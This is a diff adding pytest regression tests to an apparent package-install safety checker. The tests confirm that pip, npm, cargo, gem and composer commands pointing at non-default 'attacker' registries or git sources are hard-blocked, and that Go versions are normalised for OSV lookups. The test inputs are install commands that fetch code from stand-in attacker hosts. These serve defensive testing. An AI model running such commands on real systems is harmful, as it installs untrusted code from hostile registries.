@@ -575,6 +575,116 @@ class TestUnverifiableInstallForms:
         assert len(result.packages) == 2
 
 
+class TestAlternativeSourceBypass:
+    """Alt-source flags redirect installs to non-default registries that
+    OSV's data does not cover — a significant bypass if not hard-blocked.
+    Regression for the sixth-pass review finding §1."""
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "pip install --index-url http://attacker/simple/ requests",
+            "pip install -i http://attacker/simple/ requests",
+            "pip install --extra-index-url http://attacker/simple/ requests",
+            "pip install --find-links http://attacker/wheels/ requests",
+            "pip install -f http://attacker/wheels/ requests",
+            "pip install --index-url=http://attacker/simple/ requests",  # = form
+        ],
+    )
+    def test_pip_alt_source_hard_blocks(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None, f"{command!r} not blocked"
+        assert "non-default index" in result.hard_block_reason
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "npm install --registry http://attacker/ left-pad",
+            "npm install --registry=http://attacker/ left-pad",
+        ],
+    )
+    def test_npm_alt_source_hard_blocks(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None
+        assert "non-default registry" in result.hard_block_reason
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "cargo install --git https://attacker/repo serde",
+            "cargo install --path ./local serde",
+            "cargo install --branch evil serde",
+            "cargo install --tag v1.0 serde",
+            "cargo install --rev abc123 serde",
+            "cargo install --registry attacker-registry serde",
+            "cargo install --index http://attacker/ serde",
+        ],
+    )
+    def test_cargo_alt_source_hard_blocks(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None
+        assert "non-default source" in result.hard_block_reason
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "gem install -s http://attacker/ rails",
+            "gem install --source http://attacker/ rails",
+        ],
+    )
+    def test_gem_alt_source_hard_blocks(self, command: str):
+        result = analyze_command(command)
+        assert result.hard_block_reason is not None
+        assert "non-default source" in result.hard_block_reason
+
+    def test_composer_alt_source_hard_blocks(self):
+        result = analyze_command("composer require --repository https://attacker/ vendor/pkg")
+        assert result.hard_block_reason is not None
+        assert "non-default repository" in result.hard_block_reason
+
+    def test_clean_commands_still_pass(self):
+        # Regression: normal installs without alt-source flags must still parse.
+        r1 = analyze_command("pip install requests==2.31.0")
+        assert r1.hard_block_reason is None
+        assert len(r1.packages) == 1
+
+        r2 = analyze_command("cargo install ripgrep")
+        assert r2.hard_block_reason is None
+        assert len(r2.packages) == 1
+
+
+class TestGoVersionNormalisation:
+    """Go advisories are indexed against semver tags. Branch names and
+    commit SHAs don't round-trip through an exact-version OSV query,
+    so they get reduced to `version=None` to force a name-only fallback
+    lookup. Regression for sixth-pass review §2."""
+
+    @pytest.mark.parametrize(
+        ("spec", "expected_version"),
+        [
+            ("github.com/foo/bar@v1.2.3", "v1.2.3"),
+            ("github.com/foo/bar@v1.2.3-beta", "v1.2.3-beta"),
+            # Pseudo-version
+            ("github.com/foo/bar@v0.0.0-20240101120000-abcdef123456", "v0.0.0-20240101120000-abcdef123456"),
+            # Branch names → None (OSV can't match branches)
+            ("github.com/foo/bar@main", None),
+            ("github.com/foo/bar@master", None),
+            ("github.com/foo/bar@evil-branch", None),
+            # Commit SHA → None
+            ("github.com/foo/bar@abc123def456", None),
+            # Tags we already handled
+            ("github.com/foo/bar@latest", None),
+            ("github.com/foo/bar@upgrade", None),
+            # Empty
+            ("github.com/foo/bar", None),
+        ],
+    )
+    def test_version_normalisation(self, spec: str, expected_version: str | None):
+        refs = parse_install_commands(f"go install {spec}")
+        assert len(refs) == 1
+        assert refs[0].version == expected_version
+
+
 class TestGoRunFalsePositive:
     """Non-install go commands with command substitution must not hard-block.
     Regression for the devil-review false-positive flag on `\\bgo\\b`."""
